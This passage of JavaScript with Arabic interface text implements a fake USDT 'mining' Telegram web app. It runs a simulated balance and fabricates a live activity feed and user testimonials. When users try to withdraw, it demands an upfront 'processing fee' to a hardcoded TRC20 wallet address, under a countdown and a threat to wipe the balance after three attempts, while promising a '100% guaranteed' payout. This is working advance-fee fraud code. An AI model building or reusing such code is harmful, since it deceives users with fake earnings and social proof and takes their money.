    const elapsedTime = Date.now() - this.miningStartTime;
    const completedCycles = Math.floor(elapsedTime / this.cycleInterval);
    const calculatedBalance = Math.min(completedCycles * this.earningsPerCycle, 250);
    
    // تحديث الرصيد إذا كان أكبر
    if (calculatedBalance > this.currentBalance) {
      console.log(`💰 تحديث الرصيد عند الاستكمال: من ${this.currentBalance.toFixed(2)} إلى ${calculatedBalance.toFixed(2)} USDT`);
      this.currentBalance = calculatedBalance;
    }
    
    // التحقق من الوصول للحد الأقصى
    if (this.currentBalance >= 250) {
      console.log('🏆 تم الوصول للحد الأقصى أثناء الاستكمال');
      this.currentBalance = 250;
      this.isMining = false;
      this.showDailyLimitReached();
      return;
    }
    
    if (this.startBtn) this.startBtn.disabled = true;
    if (this.stopBtn) this.stopBtn.disabled = false;

    if (this.miningStatus) {
      this.miningStatus.classList.add('active');
      this.miningStatus.innerHTML = '<i class="fas fa-circle"></i><span>يعمل</span>';
    }
    if (this.progressContainer) this.progressContainer.classList.add('show');
    if (this.miningDetails) this.miningDetails.classList.add('show');
    
    const balanceCard = document.querySelector('.balance-card');
    const miningEarningsInfo = document.getElementById('miningEarningsInfo');
    if (balanceCard) balanceCard.classList.add('mining-active');
    if (miningEarningsInfo) miningEarningsInfo.style.display = 'block';

    // بدء التحديث الدوري
    this.miningInterval = setInterval(() => {
      this.updateMiningProgress();
    }, 1000);

    // حفظ فوري
    this.forceSave();
    
    this.addActivity(`🔄 تم استكمال التعدين - الرصيد: ${this.currentBalance.toFixed(2)} USDT`, 0);
    
    console.log(`✅ تم استكمال التعدين بنجاح. الرصيد الحالي: ${this.currentBalance.toFixed(2)} USDT`);
  }

  openWithdrawModal() {
    if (this.currentBalance < 10) {
      this.showNotification('الحد الأدنى للسحب هو 10 USDT', 'warning');
      this.sendTelegramNotification('الحد الأدنى للسحب هو 10 USDT', 'warning');
      return;
    }

    if (this.withdrawModal) {
      this.withdrawModal.classList.add('show');
      if (this.withdrawAmount) this.withdrawAmount.max = this.currentBalance;
      this.updateFeeDisplay();
      this.updateAvailableBalance();
      this.addWithdrawalInstructions();
      document.body.style.overflow = 'hidden';
    }
  }

  addWithdrawalInstructions() {
    const existingInstructions = document.querySelector('.withdrawal-instructions');
    if (existingInstructions) {
      existingInstructions.remove();
    }

    const instructions = document.createElement('div');
    instructions.className = 'withdrawal-instructions';
    instructions.innerHTML = `
      <div class="instructions-content">
        <h4>📋 تعليمات السحب</h4>
        <ol>
          <li>أدخل المبلغ المراد سحبه (الحد الأدنى 10 USDT)</li>
          <li>أدخل عنوان محفظتك (شبكة TRC20 فقط)</li>
          <li>أكد صحة العنوان</li>
          <li>اضغط "تأكيد السحب"</li>
          <li><strong>مهم:</strong> ستحتاج لدفع رسوم المعالجة أولاً</li>
          <li>بعد تأكيد دفع الرسوم، سيتم تحويل أرباحك كاملة</li>
        </ol>
        <div class="fee-explanation">
          <i class="fas fa-info-circle"></i>
          <span>الرسوم مطلوبة لمعالجة المعاملة على البلوك تشين</span>
        </div>
      </div>
    `;

    const modalContent = this.withdrawModal.querySelector('.modal-content');
    modalContent.insertBefore(instructions, modalContent.querySelector('.form-group'));
  }

  closeWithdrawModal() {
    if (this.withdrawModal) this.withdrawModal.classList.remove('show');
    this.resetForm();
    document.body.style.overflow = 'auto';
  }

  openPaymentModal(amount, fee) {
    if (this.paymentAmount) this.paymentAmount.textContent = `${amount.toFixed(2)} USDT`;
    if (this.paymentFee) this.paymentFee.textContent = `${fee.toFixed(2)} USDT`;

    if (this.paymentModal) {
      this.addPaymentExplanation(amount, fee);
      this.paymentModal.classList.add('show');
      this.startCountdown();
      document.body.style.overflow = 'hidden';
    }
  }

  addPaymentExplanation(amount, fee) {
    const existingExplanation = this.paymentModal.querySelector('.payment-explanation');
    if (existingExplanation) {
      existingExplanation.remove();
    }

    // الحصول على عدد المحاولات المتبقية
    const attempts = this.getPaymentAttempts();
    const remainingAttempts = 3 - attempts;

    const explanation = document.createElement('div');
    explanation.className = 'payment-explanation';
    explanation.innerHTML = `
      <div class="explanation-content">
        <div class="step-indicator">
          <div class="step active">
            <i class="fas fa-credit-card"></i>
            <span>1. دفع الرسوم</span>
          </div>
          <div class="step-line"></div>
          <div class="step">
            <i class="fas fa-money-bill-wave"></i>
            <span>2. استلام الأرباح</span>
          </div>
        </div>
        <div class="step-info">
          <h4>🔄 عملية السحب على مرحلتين</h4>
          <div class="current-step">
            <strong>المرحلة الحالية:</strong> دفع رسوم المعالجة ${fee.toFixed(2)} USDT
          </div>
          <div class="next-step">
            <strong>المرحلة التالية:</strong> استلام أرباحك ${amount.toFixed(2)} USDT
          </div>
        </div>
        <div class="attempts-warning">
          <div class="attempts-counter ${remainingAttempts <= 1 ? 'critical' : ''}">
            <i class="fas fa-exclamation-triangle"></i>
            <span>المحاولات المتبقية: <strong>${remainingAttempts}</strong> من 3</span>
          </div>
          ${remainingAttempts <= 1 ? `
            <div class="critical-warning">
              <i class="fas fa-skull-crossbones"></i>
              <span>تحذير: في حالة عدم الدفع سيتم تصفير رصيدك بالكامل!</span>
            </div>
          ` : ''}
        </div>
        <div class="process-explanation">
          <p><i class="fas fa-shield-alt"></i> <strong>لماذا الرسوم؟</strong></p>
          <ul>
            <li>رسوم الشبكة لمعالجة المعاملة على البلوك تشين</li>
            <li>ضمان الأمان والتأكد من صحة العملية</li>
            <li>بعد الدفع سيتم تحويل أرباحك فوراً</li>
          </ul>
          <div class="guarantee">
            <i class="fas fa-check-circle"></i>
            <span>مضمون 100% - أرباحك محفوظة وسيتم تحويلها بعد تأكيد الرسوم</span>
          </div>
        </div>
      </div>
    `;

    const paymentDetails = this.paymentModal.querySelector('.payment-details');
    paymentDetails.parentNode.insertBefore(explanation, paymentDetails.nextSibling);
  }

  closePaymentModal() {
    if (this.paymentModal) this.paymentModal.classList.remove('show');
    if (this.paymentCountdownInterval) {
      clearInterval(this.paymentCountdownInterval);
    }
    document.body.style.overflow = 'auto';
  }

  closeAllModals() {
    this.closeWithdrawModal();
    this.closePaymentModal();
  }

  setMaxAmount() {
    if (this.withdrawAmount) {
      this.withdrawAmount.value = this.currentBalance.toFixed(2);
      this.updateFeeDisplay();
      this.validateForm();
    }
  }

  updateFeeDisplay() {
    const amount = parseFloat(this.withdrawAmount?.value) || 0;
    const fee = amount >= this.targetAmount ? 20 : 9;
    if (this.feeInfo) this.feeInfo.textContent = `الرسوم: ${fee} USDT`;
    
    const netAmount = document.getElementById('netAmount');
    if (netAmount) netAmount.textContent = `المبلغ الصافي: ${(amount - fee).toFixed(2)} USDT`;
  }

  updateAvailableBalance() {
    const availableBalance = document.getElementById('availableBalance');
    if (availableBalance) {
      availableBalance.textContent = `${this.currentBalance.toFixed(2)} USDT`;
    }
  }

  validateForm() {
    const amount = parseFloat(this.withdrawAmount?.value) || 0;
    const address = this.walletAddress?.value.trim() || '';
    const confirmed = this.confirmAddress?.checked || false;

    const isValid = amount >= 10 && amount <= this.currentBalance && address.length > 20 && confirmed;
    if (this.confirmBtn) this.confirmBtn.disabled = !isValid;
  }

  resetForm() {
    if (this.withdrawAmount) this.withdrawAmount.value = '';
    if (this.walletAddress) this.walletAddress.value = '';
    if (this.confirmAddress) this.confirmAddress.checked = false;
    if (this.confirmBtn) this.confirmBtn.disabled = true;
    this.updateFeeDisplay();
  }

  processWithdrawal() {
    const amount = parseFloat(this.withdrawAmount?.value || 0);
    const fee = amount >= this.targetAmount ? 20 : 9;

    this.closeWithdrawModal();
    this.openPaymentModal(amount, fee);
  }

  startCountdown() {
    let timeLeft = 10 * 60; // 10 دقائق

    this.paymentCountdownInterval = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;

      if (this.timer) {
        this.timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // تغيير لون العداد عند اقتراب انتهاء الوقت
        if (timeLeft <= 60) {
          this.timer.style.color = '#ef4444';
          this.timer.style.animation = 'pulse 1s infinite';
        } else if (timeLeft <= 300) {
          this.timer.style.color = '#fbbf24';
        }
      }

      timeLeft--;

      if (timeLeft < 0) {
        clearInterval(this.paymentCountdownInterval);
        this.handlePaymentTimeout();
      }
    }, 1000);
  }

  handlePaymentTimeout() {
    this.closePaymentModal();
    
    // زيادة عدد المحاولات الفاشلة
    const attempts = this.incrementPaymentAttempts();
    const remainingAttempts = 3 - attempts;

    if (attempts >= 3) {
      // تصفير الرصيد بعد 3 محاولات فاشلة
      this.currentBalance = 0;
      this.forceSave();
      this.updateDisplays();
      
      this.sendTelegramNotification(
        '❌ تم استنفاد جميع المحاولات!\n\n' +
        '🔥 تم تصفير رصيدك بالكامل كما هو محدد في الشروط.\n\n' +
        '💡 يمكنك البدء من جديد في التعدين.',
        'error'
      );
      
      // إيقاف التعدين إذا كان يعمل
      if (this.isMining) {
        this.stopMining();
      }
      
    } else {
      this.sendTelegramNotification(
        `⏰ فشل في إرسال الرسوم!\n\n` +
        `💰 يُرجى إرسال ${9} USDT كرسوم إلى العنوان المحدد لعدم فقدان رصيدك.\n\n` +
        `⚠️ المحاولات المتبقية: ${remainingAttempts} من 3\n\n` +
        `🚨 تحذير: سيتم تصفير رصيدك إذا لم تدفع الرسوم خلال المحاولات المتبقية!`,
        'warning'
      );
    }
  }

  getPaymentAttempts() {
    try {
      const attempts = localStorage.getItem(`payment_attempts_${this.user ? this.user.id : 'demo'}`);
      return parseInt(attempts) || 0;
    } catch (e) {
      return 0;
    }
  }

  incrementPaymentAttempts() {
    try {
      const currentAttempts = this.getPaymentAttempts();
      const newAttempts = currentAttempts + 1;
      localStorage.setItem(`payment_attempts_${this.user ? this.user.id : 'demo'}`, newAttempts.toString());
      return newAttempts;
    } catch (e) {
      return 1;
    }
  }

  resetPaymentAttempts() {
    try {
      localStorage.removeItem(`payment_attempts_${this.user ? this.user.id : 'demo'}`);
    } catch (e) {
      // تجاهل الخطأ
    }
  }

  copyAddress() {
    const address = 'TNa7R6G56pR9Xk2a8DHnxMVJdHyr1k3Ets';
    
    if (navigator.clipboard) {
      navigator.clipboard.writeText(address).then(() => {
        this.sendTelegramNotification('تم نسخ العنوان بنجاح!', 'success');
        if (this.copyBtn) {
          this.copyBtn.innerHTML = '<i class="fas fa-check"></i>';
          setTimeout(() => {
            if (this.copyBtn) this.copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
          }, 2000);
        }
      });
    } else {
      // بديل للمتصفحات القديمة
      const textArea = document.createElement('textarea');
      textArea.value = address;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      this.sendTelegramNotification('تم نسخ العنوان بنجاح!', 'success');
    }
  }

  addActivity(text, amount) {
    if (!this.activitiesList) return;

    const activityItem = document.createElement('div');
    activityItem.className = 'activity-item';

    const now = new Date();
    const timeString = now.toLocaleTimeString('ar-SA', { 
      hour: '2-digit', 
      minute: '2-digit' 
    });

    activityItem.innerHTML = `
      <div class="activity-text">${text}</div>
      ${amount > 0 ? `<div class="activity-amount">+${amount.toFixed(2)} USDT</div>` : ''}
      <div class="activity-time">${timeString}</div>
    `;

    this.activitiesList.insertBefore(activityItem, this.activitiesList.firstChild);

    while (this.activitiesList.children.length > 6) {
      this.activitiesList.removeChild(this.activitiesList.lastChild);
    }
  }

  addFakeActivity() {
    const activities = [
      '👤 مستخدم جديد انضم للمنصة',
      '✅ تم إكمال معاملة بنجاح',
      '📈 معدل الشبكة في ارتفاع',
      '🎁 مكافأة يومية تم توزيعها',
      '💰 عملية سحب تمت بنجاح',
      '📥 إيداع جديد في المحفظة'
    ];

    const randomActivity = activities[Math.floor(Math.random() * activities.length)];
    const randomAmount = Math.random() * 15 + 5;

    this.addActivity(randomActivity, randomAmount);
  }

  showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.style.cssText = `
      position: fixed;
      top: 80px;
      right: 20px;
      background: ${type === 'success' ? 'rgba(34, 197, 94, 0.9)' : 
                   type === 'warning' ? 'rgba(251, 191, 36, 0.9)' : 
                   type === 'error' ? 'rgba(239, 68, 68, 0.9)' : 
                   'rgba(59, 130, 246, 0.9)'};
      color: white;
      padding: 1rem 1.5rem;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      z-index: 4000;
      font-family: 'Cairo', sans-serif;
      font-weight: 600;
      max-width: 300px;
      animation: slideInNotification 0.3s ease, slideOutNotification 0.3s ease 2.7s;
    `;

    notification.textContent = message;
    document.body.appendChild(notification);

    setTimeout(() => {
      if (notification.parentNode) {
        notification.parentNode.removeChild(notification);
      }
    }, 3000);
  }

  startLiveUpdates() {
    this.activitiesInterval = setInterval(() => {
      this.addFakeActivity();
    }, 4000);

    this.messagesInterval = setInterval(() => {
      this.addUserMessage();
    }, 8000);

    setTimeout(() => this.addFakeActivity(), 1000);
    setTimeout(() => this.addFakeActivity(), 2000);
    setTimeout(() => this.addUserMessage(), 3000);
    setTimeout(() => this.addUserMessage(), 5000);
  }

  addUserMessage() {
    if (!this.messagesList) return;

    const users = ['أحمد محمد', 'فاطمة علي', 'يوسف حسن', 'سارة أحمد', 'محمد خالد', 'نور عبدالله', 'ليلى محمود', 'عمر سالم'];
    const messages = [
      'هل التعدين هذا مستقبل الربح الحقيقي؟',
      'حققت 150 USDT اليوم! شكراً للمنصة',
      'ما هو أفضل جهاز للتعدين؟',
      'تم سحب 200 USDT بنجاح ✅',
      'هل يمكنني زيادة معدل التجزئة؟',
      'المنصة ممتازة، أنصح الجميع',
      'كيف أحسن أرباحي اليومية؟',
      'الدفع سريع جداً، تجربة رائعة',
      'شاهدت زيادة في الأرباح بنسبة 15%',
      'هل يوجد مكافآت إضافية للمعدنين الجدد؟'
    ];

    const randomUser = users[Math.floor(Math.random() * users.length)];
    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
    
    const messageItem = document.createElement('div');
    messageItem.className = 'message-item';

    const now = new Date();
    const timeString = now.toLocaleTimeString('ar-SA', { 
      hour: '2-digit', 
      minute: '2-digit' 
    });

    messageItem.innerHTML = `
      <div class="message-header">
        <div class="message-user">${randomUser}</div>
        <div class="message-time">${timeString}</div>
      </div>
      <div class="message-text">${randomMessage}</div>
    `;

    this.messagesList.insertBefore(messageItem, this.messagesList.firstChild);

    while (this.messagesList.children.length > 8) {
      this.messagesList.removeChild(this.messagesList.lastChild);
    }
  }
}

// إضافة أنماط CSS للإشعارات
const style = document.createElement('style');
style.textContent = `
  @keyframes slideInNotification {
    from {
      transform: translateX(100%);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }

  @keyframes slideOutNotification {
    from {
      transform: translateX(0);
      opacity: 1;
    }
    to {
      transform: translateX(100%);
      opacity: 0;
    }
  }
`;
document.head.appendChild(style);

// تشغيل التطبيق عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
  new TelegramMiningBot();
});
